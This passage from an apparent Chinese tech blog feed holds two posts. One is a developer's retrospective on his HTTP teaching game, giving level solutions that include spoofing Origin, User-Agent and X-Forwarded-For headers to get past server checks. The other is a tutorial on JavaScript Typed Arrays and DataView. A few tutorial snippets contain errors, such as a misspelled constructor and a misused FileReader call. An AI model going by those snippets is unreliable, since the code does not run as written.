因為我覺得這樣很 cool，你用 terminal 搭配指令就可以玩這個遊戲，甚至連瀏覽器都不需要開！
因此，在畫面的呈現上從最初我就打算是純文字的，沒有任何連結或是花花綠綠的東西，它就是個純文字檔！如果有連結也不會有 &lt;a&gt;，就只會是個 URL 而已。
形式的話，就是比照其他遊戲用闖關的。
大致上都定好之後，就是要來決定關卡的內容要有哪些。在一開始我原本想做二十關，後來列一列想要出現的題目，發現大概只能做個六七關左右。
原本的構想如下：

CURD 一定要有，要讓學生會串 API 的這四種基本操作
custom header 一定要有
origin 相關的題目一定要有
user agent 相關的題目一定要有

後三個一定要有是因為我覺得這在理解 HTTP 跟串 API 上面也很重要。
custom header 常常會來帶一些額外資訊，或是最常做的就是驗證。origin 的話想讓學生理解 same origin policy 只跟瀏覽器有關，脫離了瀏覽器就完全沒有這個限制。user agent 則是工作上滿實用的，會需要判斷使用者的瀏覽器或是偵測是不是搜尋引擎來做相對應的處理。
要出現的東西大致上有想法了，最後就是實際的內容跟 token 的設計。遊戲的內容如果只有：「請你 POST 一筆資料去 XXX」太無聊了，所以我把場景設定在玩家是一個去圖書館幫忙的新手，要幫助老爺爺解決一些圖書資訊系統的問題。
至於書籍資料我就很快去某網站爬了一下然後稍微做處理，資料的部分就這樣很快搞定了。
有了故事之後，還想要藏幾個彩蛋在裡面。與其說是彩蛋，不如說是一些我覺得比較有趣的小東西，看看有沒有人會發現。因此在關卡的內容跟 token 上面其實都有藏一些東西。
我記得最初的版本我大概花了兩天就做完了。一天想關卡另外一天寫 code，想關卡的部分花比較久，因為程式碼實做的部分滿簡單的。
接著就讓我們先來看看前十關每一關的內容吧！
再次強調，如果你還沒破完，強烈建議不要觀看！趕快先去玩：Lidemy HTTP Challenge。
第一關啊...好久沒有看到年輕人到我這個圖書館了，我叫做 lib，是這個圖書館的管理員很開心看到有年輕人願意來幫忙，最近圖書館剛換了資訊系統，我都搞不清楚怎麼用了...  這是他們提供給我的文件，我一個字都看不懂，但對你可能會有幫助先把這文件放一旁吧，這個待會才會用到你叫做什麼名字呢？用 GET 方法跟我說你的 name 叫做什麼吧！除了 token 以外順便把 name 一起帶上來就可以了

第一關只是想讓大家先拿到 API 文件，然後熟悉一下有些關卡會需要直接把資訊帶在網址上，因此第一關就只是讓大家熟悉環境而已。
傳入 name 以後，就可以拿到第二關的 token。
其實這邊剛開始的時候有不少人卡住，因為題目說明不清楚，所以有些人會以為是不是要去 call API 之類的。後來我就改了一下題目說明，盡可能講清楚，之後也新增了提示的功能。
第二關我前陣子在整理書籍的時候看到了一本我很喜歡的書，可是現在卻怎麼想都想不起來是哪一本...我只記得那本書的 id 是兩位數，介於 54~58 之間，你可以幫幫我嗎？找到是哪一本之後把書的 id 用 GET 傳給我就行了。

這關的 id 範圍是 54~58，其實原本就是想讓大家一個一個試，沒有其他方法。
這邊藏的小彩蛋是 id 56 的書籍就是 5566 的書：
&#123;&quot;id&quot;:56,&quot;name&quot;:&quot;5566－認真&quot;,&quot;author&quot;:&quot;鄭佩芬&quot;,&quot;ISBN&quot;:&quot;0614361311&quot;&#125;

所以下一關的 token 才會是 5566NO1
第三關真是太感謝你幫我找到這本書了！  剛剛在你找書的時候有一批新的書籍送來了，是這次圖書館根據讀者的推薦買的新書，其中有一本我特別喜歡，想要優先上架。書名是《大腦喜歡這樣學》，ISBN 為 9789863594475。  就拜託你了。新增完之後幫我把書籍的 id 用 GET 告訴我。

這關就只是在測驗會不會用 POST 而已。
有一個小地方是原本 API 文件沒有寫清楚要怎樣 POST，content type 是 form 還是 JSON？所以後來把這塊補上去了，避免產生歧義。
第四關我翻了一下你之前幫我找的那本書，發現我記錯了...這不是我朝思暮想的那一本。我之前跟你講的線索好像都是錯的，我記到別本書去了，真是抱歉啊。我記得我想找的那本書，書名有：「世界」兩字，而且是村上春樹寫的，可以幫我找到書的 id 並傳給我嗎？

這關測驗會不會使用 API 的參數來查詢書籍，但要作弊直接在 local 搜尋其實也可以。
我自己滿愛村上春樹，而我有個朋友酷愛《世界末日與冷酷異境》這本書，所以就把它放進來了。為了讓搜尋「世界」的時候不要只出現一個結果，我還去找了其他幾本也有這個關鍵字的書放進去。
而下一關的 token HarukiMurakami 就是村上春樹的名字。 
第五關昨天有個人匆匆忙忙跑過來說他不小心捐錯書了，想要來問可不可以把書拿回去。跟他溝通過後，我就把他捐過來的書還他了，所以現在要把這本書從系統裡面刪掉才行。那本書的 id 是 23，你可以幫我刪掉嗎？

這關考 DELETE 的使用而已，沒什麼難度。
這邊藏的小彩蛋是他捐錯的書是雞排妹寫真集，所以想趕快拿回去。這也對應到了下一關的 token：CHICKENCUTLET。
第六關我終於知道上次哪裡怪怪的了！照理來說要進入系統應該要先登入才對，怎麼沒有登入就可以新增刪除...這太奇怪了，我已經回報給那邊的工程師了，他們給了我一份新的文件：這邊是帳號密碼，你先登入試試看吧，可以呼叫一個 /me 的 endpoint，裡面會給你一個 email。把 email 放在 query string 上面帶過來，我看看是不是對的。帳號：admin密碼：admin123

對新手來說其實算是比較有挑戰性的一關。
這關考的是知不知道怎麼樣在 header 裡面放內容，以及根據資料去找出怎麼用 http basic authorization。主要是想讓大家知道 HTTP 的其中一種驗證方式。
第七關那邊的工程師說系統整個修復完成了，剛好昨天我們發現有一本書被偷走了...這本書我們已經買第五次了，每次都被偷走，看來這本書很熱門啊。我們要把這本書從系統裡面刪掉，就拜託你了。對了！記得要用新的系統喔，舊的已經完全廢棄不用了。書的 id 是 89。

其實只是沒梗了所以又加一個刪除資料的關卡，這邊的一個小插曲是原本沒有「對了！記得要用新的系統喔，舊的已經完全廢棄不用了。」這句，導致有些人還是用舊版 API，因此才加上去，避免大家搞混。
這本很熱門的書你實際上去看的話，會發現是《跟著月亮走：韓國瑜的夜襲精神與奮進人生》，對應到了下一關的 token：HsifnAerok，倒過來就變 KoreanFish。
第八關我昨天在整理書籍的時候發現有一本書的 ISBN 編號跟系統內的對不上，仔細看了一下發現我當時輸入系統時 key 錯了。哎呀，人老了就是這樣，老是會看錯。  那本書的名字裡面有個「我」，作者的名字是四個字，key 錯的 ISBN 最後一碼為 7，只要把最後一碼改成 3 就行了。對了！記得要用新的系統喔，舊的已經完全廢棄不用了。

這關就考找資料跟修改資料而已，沒什麼特別的。
下一關也就是第九關的 token 是NeuN，德文中的九。
第九關API 文件裡面有個獲取系統資訊的 endpoint 你記得嗎？工程師跟我說這個網址不太一樣，用一般的方法是沒辦法成功拿到回傳值的。  想要存取的話要符合兩個條件：1. 帶上一個 X-Library-Number 的 header，我們圖書館的編號是 202. 伺服器會用 user agent 檢查是否是從 IE6 送出的 Request，不是的話會擋掉  順利拿到系統資訊之後應該會有個叫做 version 的欄位，把裡面的值放在 query string 給我吧。

這關考兩個東西：

會不會傳 custom header
知不知道怎麼改 user agent，以及是否知道 user agent 代表的意義

這兩個就是前面有說過我一定要放進來的元素，因為我覺得很重要。
我想讓學生們知道說 user agent 其實有滿多作用，其中一個就包含讓 server 知道你的瀏覽器跟作業系統之類的；也想讓他們知道這些東西都可以偽造。
原本其實是設定 Server 會檢查是不是從 Safari 送出的 Request，但用 mac 的人就可以開 Safari 過關，因此後來才改成用 IE6。如果你要去裝 IE6 的 VM 那我也就算了XD
下一關的 token 是duZDsG3tvoA，其實是 YouTube 的影片 ID，對應到的是周杰倫的半島鐵盒。因為我滿喜歡這首歌，而且這首歌跟書也有點關係。
第十關時間過得真快啊，今天是你在這邊幫忙的最後一天了。  我們來玩個遊戲吧？你有玩過猜數字嗎？  出題者會出一個四位數不重複的數字，例如說 9487。你如果猜 9876，我會跟你說 1A2B，1A 代表 9 位置對數字也對，2B 代表 8 跟 7 你猜對了但位置錯了。  開始吧，把你要猜的數字放在 query string 用 num 當作 key 傳給我。

原本是想讓大家真的來玩猜數字，預計猜個五六次就可以破關。但判斷邏輯我沒寫好，所以你傳一個數字或是重複數字我都沒擋掉，或者是你要直接暴力嘗試 9999 種組合也沒人攔你，所以這題的解法就很多種。
到這邊為止，就是前十關的內容。
第一次優化做完前十關之後讓一些朋友先試玩，得到的反應都還不錯，但也發現一些問題，其中有些我上面已經提過了，例如說：

第一關說明不清楚，不知道 name 要傳到哪裡
沒有提示要用新版 API，以為可以用舊的
如果瀏覽器那關限制 Safari，對 Mac 使用者毫無難度

上述問題基本上都可以透過加強文字敘述來改善，但還發現一個更大的問題：

卡關

雖然說卡關是人之常情，但其實我不希望大家一直卡關。畢竟這個遊戲的最終目的其實是學習，好玩對我來說只是附加價值。可是我又不能破壞遊戲體驗，直接講解答，因此我必須提供一個方法讓他們可以看到提示。
你可能會問我那提示幹嘛不用白色文字就好，還要加 &amp;hint=1 這麼麻煩。你可能忘了，我開頭有說初衷是想讓 curl 也可以玩這個遊戲，所以白色文字是沒有用的。
總之呢，最後加上了提示的功能，讓遊戲變得更完整了，體驗也變得更好。
原本遊戲就到這邊結束了，但剛好我又有了一些靈感，所以繼續往下做了一些關卡，下面來講講進階關卡。
第十一關嘿！很開心看到你願意回來繼續幫忙，這次我們接到一個新的任務，要跟在菲律賓的一個中文圖書館資訊系統做串連這邊是他們的 API 文件，你之後一定會用到。  現在就讓我們先跟他們打個招呼吧，只是我記得他們的 API 好像會限制一些東西就是了...

這關是開頭所提到的，一定要做的 origin 相關關卡。會放在進階關是因為怕對我學生來說有些太難，所以才放這裡。
總之是想讓大家理解就算 Server 檢查 origin，Client 也可以輕易偽造。然後這跟瀏覽器的 CORS 一點關係都沒有，大家要很清楚 Request 從瀏覽器發出來以及自己發 Request 是兩件很不一樣的事，前者會有許多限制，後者沒有。
下一關的 tokenr3d1r3c7其實是 leet 的redirect，已經暗示了下一關的解法。
第十二關打完招呼之後我們要開始送一些書過去了，不過其實運送沒有你想像中的簡單，不是單純的 A 到 B 而已而是像轉機那樣，A 到 C，C 才到 B，中間會經過一些轉運點才會到達目的地...算了，我跟你說那麼多幹嘛  現在請你幫我把運送要用的 token 給拿回來吧，要有這個 token 我們才能繼續往下一步走

這一關也是後期我很想放的一關，覺得這樣的概念滿有趣的。透過在 redirect 過程的途中塞東西，強迫大家去理解 server side redirect 的原理是什麼（301 跟 302 status code）。
若是你不懂為什麼可以轉址以及轉址背後的原理，你就解不開這題。
下一關的 token 為qspyz，往左平移一個字元之後變成proxy，一樣暗示著下一關的解法。
第十三關太好了！自從你上次把運送用的 token 拿回來以後，我們就密切地與菲律賓在交換書籍可是最近碰到了一些小問題，不知道為什麼有時候會傳送失敗我跟他們反映過後，他們叫我們自己去拿 log 來看，你可以幫我去看看嗎？從系統日誌裡面應該可以找到一些端倪。

這關是在考 proxy 的使用，因為 Server 會檢查使用者的 IP 是否來自於菲律賓。
檢查的方法是用 node-geoip：
advancedRouter.get(&#x27;/logs&#x27;, (req, res) =&gt; &#123;  const ip = req.ip || &#x27;&#x27;  const info = geoip.lookup(ip) || &#123;&#125;  if (info.country === &#x27;PH&#x27;) &#123;    res.end(text.lv13.reply)  &#125; else &#123;    res.end(text.lv13.wa)  &#125;&#125;)

所以只要隨便找一個在菲律賓的 proxy 來送 request 就可以過關了。
不過這關有兩件出乎意料的事，第一件事是滿多人都會嘗試偽造Accept-Language這個 header，這我當初完全沒想到（不過也沒用就是了）。
第二件事是這題還有另一個解答，就是偽造X-Forwarded-For，這也是我當初完全沒想到的事。
我在 Express 裡面有開app.set(&#39;trust proxy&#39;, true)，所以在拿使用者 IP 的時候如果有X-Forwarded-For這個 header，會以這邊的資訊為準。
剛好前陣子讀到一篇類似的文章：利用X-Forwarded-For伪造客户端IP漏洞成因及防范。
雖然不是我預設的解法，但我覺得這個解法更有趣，所以就沒有特地修掉了。
第十四關跟那邊的溝通差不多都搞定了，真是太謝謝你了，關於這方面沒什麼問題了！不過我老大昨天給了我一個任務，他希望我去研究那邊的首頁內容到底是怎麼做的為什麼用 Google 一搜尋關鍵字就可以排在第一頁，真是太不合理了  他們的網站明明就什麼都沒有，怎麼會排在那麼前面？難道說他們偷偷動了一些手腳？讓 Google 搜尋引擎看到的內容跟我們看到的不一樣？  算了，還是不要瞎猜好了，你幫我們研究一下吧！

這關想讓大家知道的事情是不只瀏覽器，各家爬蟲也會帶特定的 User-Agent，所以 Server 一樣可以針對不同的 UA 來輸出不同的資訊（雖然不被推薦就是了）。
舉例來說，一個 SPA 可以只針對 Google 搜尋引擎跟 Facebook 啟用 Server side render 來輸出內容，對一般用戶還是 Client side render。
或是像 HTTP Challenge 這個網站，本身就有針對不同的 UA 做處理（因為網站都是純文字，但我希望在臉書上被分享時有自訂標題跟敘述）：
// base on UA return differect resultrouter.get(&#x27;/start&#x27;, (req, res) =&gt; &#123;  const UA = req.header(&#x27;User-Agent&#x27;) || &#x27;&#x27;  if (UA.indexOf(&#x27;facebookexternalhit&#x27;) &gt;= 0 || UA.indexOf(&#x27;Googlebot&#x27;) &gt;= 0 )&#123;    res.end(text.seo)  &#125; else &#123;    res.end(text.start.intro)  &#125;&#125;)

不過好像弄得怪怪的，不知道有沒有成功就是了。
這就是最後一關囉，第十五關是結語。
第二次優化做完進階關卡之後，敘述的部分其實也有改一點，例如說第十四關就有學生以為跟 Chrome 有關（想到 Google 就只想到 Chrome XD），所以我特地強調說「Google 搜尋引擎」，要往這方向找才是正確的。
而其中最讓我驚訝的還是第十三關那個我沒有想到的解法X-Forwarded-For。
在對外公開之後，一個朋友跟我說最後應該放一個 gist 讓大家留言。我內心一驚：對欸，可以放 gist。
因為我原本就有想說要不要放個排行榜或者是留言板之類的，讓破完的人可以留個言當作紀念，可是要做這功能挺麻煩的，我懶得做。被朋友提醒才突然發現 gist 本來就有內建留言功能，那就直接放一個 gist 就好了！
所以前期破關的朋友是沒有 gist 可以留言的，是到後面才新增的。
總結這次很開心可以把這些知識包裝成游戲跟大家分享，迴響似乎也挺不錯的。雖然有些人期待會再加新關卡，但我目前完全沒靈感就是了。
之後比較有可能的是做個 HTML、CSS 跟 JavaScript 的版本，類型差不多，但就是每關的解法跟知識點不一樣，到時候再來跟大家分享。
感謝早期幫我測試的朋友們，也感謝跟我一起享受遊戲的大家。底下是一些相關的闖關心得，有興趣的話也可以看看：

一日圖書館管理員：HTTP Challenge
HTTP_Game攻略(一)
Lidemy HTTP 圖書館小弟加班(V2)
小挑戰 http game 解題思路心得想法

關於作者：@huli 野生工程師，相信分享與交流能讓世界變得更美好
]]></content>
      <tags>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title>使用 JavaScript 處理二進位資料</title>
    <url>/2017/09/24/binary-data-manipulations-in-javascript/</url>
    <content><![CDATA[由於高度封裝與抽象，JavaScript 的執行效率比不上 C 的語言。例如 JavaScript 的 Array 下標（subscript）是根據 hash key 而非實體記憶體位址 offset 取值，雖然方便，卻多了效能開銷。當 Canvas、WebGL、WebVR 開始走紅，效能越來越受重視，如何讓 JavaScript 達到如同 C 指標般操作 binary data 變得至關重要。
存在許久但最近才變為 ES6 標準「Typed Array」就是解放 JavaScript 操作 binary data 能力的好工具！一起來了解 Typed Array 吧！
（基於 ECMAScript 6+，Node.js 8.3）


Buffer v.s ViewES6 引入的 Typed Array 家族，可以分為兩大類：Buffer 與 View。
所謂 Buffer 是一個指向儲存資料的記憶體區塊之物件，類似於 malloc 配置出來的空間，無法直接存取或修改 buffer 內部的資料，在 JavaScript 中 Buffer 的實作就是 ArrayBuffer。
如果我們想存取某些 buffer 底下的內容，我們需要 View（視圖），透過宣告不同資料型別的 view，電腦就會了解如何操作這段 data chunk，該當作 float32 讀取呢？抑或以 unsigned integer 來操作。
ES6 規範了三個 Typed Array 相關物件，對應類別如下：

ArrayBuffer：Buffer，代表一段記憶體區塊，僅能透過 View 操作其內容。
TypedArray：View，儲存固定型別資料的 Array，例如 Uint8Array（8-bit unsigned integer）、Float64Array（64-bit IEEE floating point number)。
DataView：View，不限制型別，可自定義從哪個 byte，以什麼型別，用哪種 byte order（endian）存取。

ArrayBufferArrayBuffer 代表一段固定大小的記憶體區塊，也稱為 byte-array。主要的功能就是配置實體記憶體來儲存 raw binary data。一般很少直接操作 ArrayBuffer，實際上也只能將其 reference 傳給其他物件，讓其他物件來處理／使用資料。
建立一個 ArrayBuffer 有非常多種方法，可以直接配置，
// 直接配置 8 bytes，初始值為 0 的記憶體區塊const buffer = new ArrayBuffer(8)// 利用 `slice` 將某些 bytes 複製到另一個 ArrayBuffer// 這裡複製 `buffer` 倒數四個 bytes 到 bufferCopied 中const bufferCopied = buffer.slice(-4)

或是最常使用的，HTTP response 選擇接收 buffer，
// XMLHttpRequest 指定 resopnseType (XMLHttpRequest v2)const xhr = new XMLHttpRequest()xhr.open(&#x27;GET&#x27;, &#x27;/path/to/黑人問號.jpg&#x27;, true)xhr.responseType = &#x27;arraybuffer&#x27; // 將 reponse 型別設定為 arraybufferxhr.onload = function(e) &#123;  console.log(this.response) // this.response 為 ArrayBuffer&#125;xhr.send()// Fetch API 也提供 Body#arrayBuffer 的方法轉換 Request／Response stream bodyconst response = await fetch(&#x27;/path/to/柯P火影.gif&#x27;)const buffer = await response.arrayBuffer() // 取得 ArrayBuffer 實例console.log(buffer.byteLength) // 查看當前這個 ArrayBuffer 有多少 bytes。

當然，也可以透過 File 與 FileReader API，讀取使用者上傳的資料。
const input = document.querySelector(&#x27;input&#x27;)input.addEventListener(&#x27;change&#x27;, handleFiles, false);function handleFiles (files) &#123; // files -&gt; FileList 物件，裡面有 File 實例  if (files[0]) &#123;    const reader = new FileReader()    reader.onload = function (&#123; target: &#123; result &#125; &#125;) &#123;      console.log(result.byteLength) // result 是一個 ArrayBuffer    &#125;    reader.readAsArrayBuffer = files[0] // File 是特殊的 Blob 型別  &#125;&#125;

TypedArrayTypedArray 並非任何一個型別，也非全域可取得的建構函數，而是一個抽象概念，對應到許多不同型別的 Array 罷了。老實說，TypedArray 這個的命名已說明一切，讓我來說文解字，先從 Typed 講起。
Types of TypedArray所謂的 Typed，意指「限定型別」，Array 中的元素都是同一種型別。有哪些型別呢？TypedArray 是為了操作 binary 而生，當然只有最底層以 bytes 為基礎，幾乎沒有什麼抽象概念的型別。我們可根據需求，決定每個元素該從 raw data 讀取多少與如何讀取 bytes。
目前 ES6 定義以下幾種 typed array types：



型別
bytes／元素
對應 C 語言



Int8Array
1
int8_t


Uint8Array
1
uint8_t


Uint8ClampedArray
1
uint8_t


Int16Array
2
int16_t


Uint16Array
2
uint16_t


Int32Array
4
int32_t


Uint32Array
4
uint32_t


Float32Array
4
float


Float64Array
8
double


實際上，TypedArray 本身並並不儲存任何 buffer 資料，只保存該 buffer 的 reference，我們可以透過 TypedArray#buffer 獲取原始的 ArrayBuffer。也因此，同一個 ArrayBuffer 可以建構出多個不同的 TypedArray。可視為「從不同視角解讀 ArrayBuffer 中的 binary data」。
例如下圖是一個 16 bytes 的 ArrayBuffer，我們可以透過它，建立多個不同型別的 TypedArray。

不同型別的 TypedArray 的元素對應到不同的 byte 數量，這項資訊會記錄在 TypedArray#BYTES_PER_ELEMENT property 上。例如：Uint8Array 一個元素對應到一個 byte，Float64Array 則對應到 8 bytes。
如果還是無法理解，其實可以將 TypedArray 想像為 C 語言的 void *ptr，在存取、遍歷不同 data type 的 Array 時，轉型（cast）成不同的型別，讓指標根據不同 data type 的 size 做對應 offset。
Array-like Methods而 TypedArray 中的 Array，其實就是我們熟悉的 JavaScript Array，可視為「在 ArrayBuffer 的資料之上，架一層可存取資料的 Array API」。你想得到的 method map、filter、reduce 幾乎應有盡有，而 push、shift、unshift、splice 這類會改變 Array 長度的 Mutator methods 沒有實作，畢竟 TypedArray 就只是 buffer 的 reference，pop 後原始資料依然存在。
比較好玩的是，TypedArray#subarray 和 TypedArray#slice 同樣是回傳陣列切片，slice 是回傳一個淺拷貝（shallow-copy）的新 Array，新 array 的 buffer property 指向新切出來的 buffer，byteOffset 也是依據新的 buffer，所以會是 0。
而 subarray 則是在同個 buffer 繼續切片，調用 subarray 的 buffer 會取得相同的原始 buffer，byteOffset 也是根據原始 buffer 計算 offset。
Consturct a TypedArray建構 TypedArray 非常簡單，選擇好 data type 之後，new 一個就完成了！
直接初始化
建立一個 4 * 2 bytes 初始值為 0 的 Uint16Array。
const u16 = new Uint16Array(4)

從 TypedArray 建立
我們也可以從其他 TypedArray 建立相同長度的 TypedArray，會指向同一個 buffer。
const u8 = new Uint8Array(u16) // length of u8 is 4

這樣會建立一個新的型別 array，但記憶體區塊不變。我們的例子中，u8 因為溢位的緣故（overflow），自動過濾偶數 bytes（或奇數，視 endianness 而定），僅顯示餘下 4 個 bytes 的資料，記憶體位址變得不連續。
從 ArrayBuffer 建立
不過，也可以透過 TypedArray#buffer 取得並共享當前的 buffer，該 array 的記憶體區間就會是連續的。
// 因為 buffer 總共有 4 * 2 = 8 bytes，所以 u8_continuous 長度為 8const u8_continuous = new Uint8Array(u16.buffer)

當然，ArrayBuffer 可直接配置一塊記憶體區塊，並使用它建構 TypedArray，甚至透過 length 和 byteOffset 指定該 buffer 不同的區間來建構。
const buffer = new ArrayBuffer(16)const i32 = new Int32Array(buffer) // 32 * 2 bytes// 從 4 bytes offset 的位址開始，切一個長度為 7 bytes 的 array。const i8 = new Iint8Array(buffer, 4, 7)

Overflow如同 C 語言，不同類型的 TypedArray 可以容納的 bytes 範圍是固定的，超過此一範圍，就會出現「溢位（Overflow）」，例如 Uint8Array 中僅能放入 1 byte &#x3D; 8 bits 的資料，如果放入 0x100（256，9 bits），就會溢位。
那溢位後，資料會怎麼呈現呢？
每個語言實作不盡相同，TypedArray 的溢位處理規則和多數語言相同：捨棄溢出的 high bits。 我們來看簡單的例子。
Uint8Array.of(0xff, 0x100)// Unit8Array [255, 0]

第一個例子中，我們選用 Uint8Array，一個元素最多儲存 8 bits 的資料，第二個元素是 256，需要第 9 bit 來儲存，因此溢位。
// 255，至少需要 8 bits 儲存0b11111111// 256，至少需要 9 bits 儲存0b100000000//└── 這個 1 溢位，將被捨棄，僅保留最低有效的 8 bits，計算結果為 `0`// 捨棄的方式同於 bitwise or `&amp; 0xFF`0x100 &amp; 0xFF// 0


Note：underflow 的處理方式與 overflow 相同。

What is Uint8ClampedArrayClamp 的本意是鉗子，在計算機科學中，通常意味將資料值限制在特定範圍間。而 Uint8ClampedArray 中，就是將元素值限制在 0 - 255。換句話說，就是處理溢位的規則與 Uint8Array 不同。當 overflow 時，該值會等於最大值 255；當 underflow 時，該值會等於 0。
Uint8Array.of(0xff, 0x100, -100)// Unit8Array [255, 0, 156]Uint8ClampedArray.of(0xff, 0x100, -100)// Uint8ClampedArray [255, 255, 0]

這有什麼好處呢？在影像處理上非常方便。有個很常舉的例子，有 3 bytes 的 Uint8Array 存放 RGB 色碼，我們想要增加他的 gamma factor，如果使用 Uint8Array 儲存：
// 必須自行限制大小，防止 ooverflow／underflow。u8[i] = Math.max(0, Math.min(255, u8[i] * gamma)) // u8 是一個 Uint8Array

如果是 Uint8ClampedArray，只需要直接乘上 gammer factor，非常方便。
pixels[i] *= gamma // pixels 是一個 Uint8ClampedArray

Composite Data Structure當需處理類似 C struct 的複合資料結構，如下所示
struct employee &#123;  unsigned int id;               // 4 * 1 bytes  unsigned char department[4];   // 1 * 4 bytes  float salary;         // 4 * 1 bytes&#125;;

我們可以宣告對應的 TypedArray 來處理。模擬出如果 C struct 的資料結構。
const buffer = new ArrayBuffer(12)const idView = new Uint32Array(buffer, 0, 1)const deptView = new Uint8Array(buffer, 4, 4)const salaryView = new Float32Array(buffer, 8)idView[0] = 123deptView.forEach((_, i) =&gt; &#123; deptView[i] = i * i &#125;)salaryView[0] = 10000

DataView顧名思義，DataView 是一種建構在 buffer 之上的 view。與一般 TypedArray 不同的是，建構 DataView 時並不會固定的資料型別，取而代之的是存取 data 時，必須明確的指定從哪個 byte offset 取哪一種 data type 出來。
借用前例的複合資料來示範，DataView 如何針對每個 bytes 處理自定義的資料。
const dv = new DataView(buffer)// 從 byte offset 0 的位址開始取 Uint32 的資料// 取得 ID -&gt; 123dv.getUint32(0, true)// 從 byte offset 8 的位址開始寫入 Float32 的資料dv.setFloat32(8, 200000, true)dv.getFloat32(8, true) // 加薪囉！！

各位有沒有注意到，DataView 的 bytes getter／setter 最後面都多帶了一個 boolean 參數？這個參數是指定使用 Little-endian 讀取資料，預設為 false 也就是以 Big-endian 讀取。可控制 endian 是 DataView 蠻重要但也頗惱人的特性，在下一節會介紹 Endianness。
DataView 另一個重要特性就是不會 buffer overflow，所謂的 buffer overflow 是「當寫入一筆資料到指定 buffer 中，若寫入的資料大小超過該 buffer 的 boundary，溢出值就會覆寫下個 byte」。這種不安全的性質，也讓 buffer overflow 成為許多駭客的攻擊手法，有潛在的安全性問題。而透過 DataView setter 賦予一個超過型別最大值的數字，並不會覆蓋臨近記憶體位址的資料，而是內部先檢查邊界，處理 overflow 之後，再寫入該記憶體區間，彌補了 buffer overflow 的漏洞。
PrecautionsTyped Arrays 幾乎可以做到如同 C 語言般細膩的記憶體操作。不過越是自由的 API，就代表要學習更多知識，注意更多細節，以下是操作 TypedArray 該銘記在心的事情：

Endianness (Byte order)
Data Structure Alignment

Endianness (Byte order)在計算機科學領域下，Data 是一個物理概念，指儲存在電腦記憶體上的一個 bits／bytes 序列。Data 本身並沒有任何意義，想使用它，必須自行解讀出抽象的意義，例如將 Data 讀取為字串或數字。
我們知道記憶體是基於位址（address）依序儲存 Data，每個位址可以存上 1 byte data。如果使用 Uint8Array 這種一次存取一個 byte 的格式，那麼完全不會有任何問題，怎麼存取，都是依連續的記憶體位址順序：
--- 資料讀取順序 --&gt;| Offset | 0    | 1    | 2    | 3    || ------ | ---- | ---- | ---- | ---- || Data   | 0x11 | 0x22 | 0x33 | 0x44 |

我們會得到 [17, 34, 51, 68] 的 Array。
當我們需要一次存取多 bytes，例如這個範例的記憶體區塊其實是一個 32 bit 的整數，那實際代表的數字會是多大？是 0x11223344（十進位：287454020) 嗎？
這其實牽扯到 CPU 的設計，目前市面上的多數 CPU 處理 multi-bytes 的資料時，大多從「最低有效位（LSB，least significant byte）」，也就是從權重最小的位數開始寫入。所以讀取這筆資料時，最前面的記憶體 offset 就是最權重最小的 bytes，所以最後會得到 0x44332211（十進位：1144201745）。這種存取排序，我們稱之為 Little-endian。
有最低，當然就有最高，Big-endian 則是從「最高有效位（MSB，most significant byte）」開始存取。因此照著記憶體位址依序讀取，會得到跟記憶體 offset 順序相同的 0x11223344。Big-endian 雖然在個人電腦中不常見，但許多網路協議和設備都是採用 Big-endian 存取資料，佔有一定的重要性。
Little-endian 和 Big-endian 可以視為不同的電腦（CPU）講不同的語言，一個從右到左，另一個從左到右。其實在人類日常生活中也可以看到相同的現象，例如歐洲常用的日期格式為 day-month-year，ISO 國際標準則反之 year-month-day，所以，當你看到一個 17-09-07 的日期時，必須先判斷是否為 ISO 的標準，才能知道這場約會是在下禮拜的九月七日，抑或你需要一台時光機回到過去。
Q：那在 JavaScipt 要如何處理 endian？
如果不碰底層的記憶體操作，寫 JavaScript 是不用理會 endianness 的，但當你要操作 TypedArray 時，了解 data 的 endian 就至關重要了。TypedArray 預設是使用系統的 endianness，所以如果你接收一筆資料，與你的系統的 endianness 不一致，TypedArray 便使不上力。而前面介紹到 DataView 的 byte getter／setter 最後一個參數就是用來決定以哪種 byte order 存取資料，預設是 Big-endian（false），透過切換這個 flag，任何 binary data 都橫看成嶺側成峰了。
Q：那我們要如何得知資料的 byte order？
如果資料是自己家內部系統使用，其實溝通好就 OK，用 Mixed-endian 也不會有人管你。但如果是外界得來的任意資料，我們可以透過「BOM（byte order mark）」來判斷資料屬於哪種 endianness。BOM 是一個 Unicode  magic number，通常放置在 text stream 的最前端。不過，並不是每個資料都會加上這個 header，而且有時候我們不需要 BOM 資訊，使用資料前還必須先 strip bom，說實話挺麻煩的。
Data Structure Alignment要接觸底層的記憶體，免不了瞭解 CPU 如何從記憶體中讀取資料，記憶體底層到底如何配置。
一般來說，現代的 CPU 通常設計以 word 為單位（例如 4 bytes）讀寫記憶體裡的資料，而資料對齊（data aligment）則是將資料放置在 word-size * n 倍的記憶體位址上，使 CPU 以最為有效率的方式讀寫。那為什麼對齊 word-size 會最有效率呢？假設有個 C struct 如下：
struct AlignDemo &#123;  char c;     // 1 byte  int i;      // 4 bytes  short s;      // 2 bytes&#125;;

理論上的記憶體配置如下，總共需要 7 bytes 的記憶體空間。
c = char 所佔的 bytes = short 所佔的 bytei = int 所佔的 byte| 0x000           | 0x020           || [c] [i] [i] [i] | [i] [s] [s] [ ] |

前面提到 CPU 是以 word-size 存取記憶體上的資料，當嘗試讀取 char 和 short 時並沒有什麼問題，CPU 只需取一次 word chunk 再 offset 就可取得正確的值。然而，當欲讀取 int 時，CPU 需先取第一個 data chunk 以獲取 int 前三個 bytes，再取第二個 word chunk 並 shift 資料，以取得 int 最後一個 byte。如此多餘的記憶體存取會造成 CPU 額外的負擔。
解決方法是 Data Structure Padding，也就是在資料無法對齊 word-size 時，加上一些填充用的成員。
在我們的例子中，可以這樣做：
struct AlignDemo &#123;  char c;  char padding_0[3]; // 填充用成員  int i;  short s;  char padding_1[2];&#125;;

記憶體配置則如下：
p = padding 所佔的 byte| 0x000           | 0x020           | 0x040           || [c] [p] [p] [p] | [i] [i] [i] [i] | [s] [s] [p] [p] |

本來只需要 7 bytes，對個齊後，反而用掉這麼多額外的 bytes，你玩我嗎？
我們可以試著改變一下 struct member 的順序：
struct AlignDemo &#123;  int i;  char c;  short s;  char padding[0]&#125;;

記憶體配置對應改變，只佔用 8 bytes。Brilliant！
| 0x000           | 0x020           || [i] [i] [i] [i] | [c] [s] [s] [p] |

結構對齊（struct alignment）在 C 語言中是一門不小學問，除了結構內的成員本身要對齊，結構本身也要對齊。
回到 JavaScript，當你在創建不同的 view 時，JavaScript engine 其實會進行簡單的 natural alignment 檢查。
